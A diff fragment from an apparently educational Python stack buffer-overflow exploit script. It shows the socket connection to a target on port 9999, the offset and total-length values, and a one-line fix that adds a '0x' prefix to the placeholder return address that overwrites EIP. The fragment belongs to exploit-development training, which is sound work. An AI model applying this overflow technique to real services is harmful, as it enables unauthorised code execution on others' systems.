@@ -148,7 +148,7 @@ s.connect(("$ip", 9999))
 
 total_length = 2984 # 2 - we will be working with this value.
 offset = 2003 # 6 - this is our Offset point/value.
-new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger.
+new_eip = struct.pack("<I", 0x<our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger.
 
 # 3 - we use a list to orderly arrange each parts of our payload.
 # 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
